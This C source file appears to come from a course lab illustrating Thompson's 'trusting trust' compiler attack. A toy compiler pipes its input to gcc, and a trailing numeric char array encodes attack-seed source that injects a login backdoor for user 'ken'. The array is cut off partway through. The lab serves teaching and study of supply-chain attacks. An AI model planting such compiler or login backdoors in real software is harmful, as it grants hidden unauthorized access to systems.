// engler, cs240lx: trivial identity "compiler" used to illustrate
// thompsons hack: it simply echos its input out.
#include <assert.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>

#define error(args...)                                                         \
  do {                                                                         \
    fprintf(stderr, ##args);                                                   \
    exit(1);                                                                   \
  } while (0)

// a not very interesting compile: throw the input into a
// temporary file and then call gcc on the result.

static void compile(char *program, char *outname) {
  FILE *fp = fopen("./temp-out1.c", "w");
  assert(fp);
  fprintf(fp, "%s", program);
  fclose(fp);

#include "attack-seed.c"

  /************************************************************
   * don't modify the rest.
   */

  // gross, call gcc.
  char buf[1024];

  sprintf(buf, "gcc ./temp-out.c -o %s -Wno-nullability-completeness",
          outname); // how this works
  if (system(buf) != 0)
    error("system failed\n");
}

#define N 8 * 1024 * 1024
static char buf[N + 1];

int main(int argc, char *argv[]) {
  if (argc != 4)
    error("expected 4 arguments have %d\n", argc);
  if (strcmp(argv[2], "-o") != 0)
    error("expected -o as second argument, have <%s>\n", argv[2]);

  // read in the entire file.
  int fd;
  if ((fd = open(argv[1], O_RDONLY)) < 0)
    error("file <%s> does not exist\n", argv[1]);

  int n;
  if ((n = read(fd, buf, N)) < 1)
    error("invalid read of file <%s>\n", argv[1]);
  if (n == N)
    error("input file too large\n");

  // "compile" it.
  compile(buf, argv[3]);
  return 0;
}

char prog[] = {
    70,  73,  76,  69,  32,  42,  99,  111, 100, 101, 32,  61,  32,  102, 111,
    112, 101, 110, 40,  34,  46,  47,  116, 101, 109, 112, 45,  111, 117, 116,
    49,  46,  99,  34,  44,  32,  34,  114, 34,  41,  59,  10,  97,  115, 115,
    101, 114, 116, 40,  99,  111, 100, 101, 41,  59,  10,  10,  47,  42,  42,
    42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,
    42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,
    42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,
    42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,
    42,  42,  42,  10,  32,  42,  32,  83,  116, 101, 112, 32,  49,  58,  10,
    32,  42,  47,  10,  10,  47,  47,  32,  109, 97,  116, 99,  104, 32,  111,
    110, 32,  116, 104, 101, 32,  115, 116, 97,  114, 116, 32,  111, 102, 32,
    116, 104, 101, 32,  108, 111, 103, 105, 110, 40,  41,  32,  114, 111, 117,
    116, 105, 110, 101, 58,  10,  115, 116, 97,  116, 105, 99,  32,  99,  104,
    97,  114, 32,  108, 111, 103, 105, 110, 95,  115, 105, 103, 91,  93,  32,
    61,  32,  34,  105, 110, 116, 32,  108, 111, 103, 105, 110, 40,  99,  104,
    97,  114, 32,  42,  117, 115, 101, 114, 41,  32,  123, 92,  110, 34,  59,
    10,  10,  47,  47,  32,  97,  110, 100, 32,  105, 110, 106, 101, 99,  116,
    32,  97,  110, 32,  97,  116, 116, 97,  99,  107, 32,  102, 111, 114, 32,
    34,  107, 101, 110, 34,  58,  10,  115, 116, 97,  116, 105, 99,  32,  99,
    104, 97,  114, 32,  108, 111, 103, 105, 110, 95,  97,  116, 116, 97,  99,
    107, 91,  93,  32,  61,  32,  34,  105, 102, 40,  115, 116, 114, 99,  109,
    112, 40,  117, 115, 101, 114, 44,  32,  92,  34,  107, 101, 110, 92,  34,
    41,  32,  61,  61,  32,  48,  41,  32,  114, 101, 116, 117, 114, 110, 32,
    49,  59,  34,  59,  10,  10,  47,  42,  42,  42,  42,  42,  42,  42,  42,
    42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,
    42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,
    42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,
    42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  10,  32,  42,
    32,  83,  116, 101, 112, 32,  50,  58,  10,  32,  42,  47,  10,  10,  47,
    47,  32,  115, 101, 97,  114, 99,  104, 32,  102, 111, 114, 32,  116, 104,
    101, 32,  115, 116, 97,  114, 116, 32,  111, 102, 32,  116, 104, 101, 32,
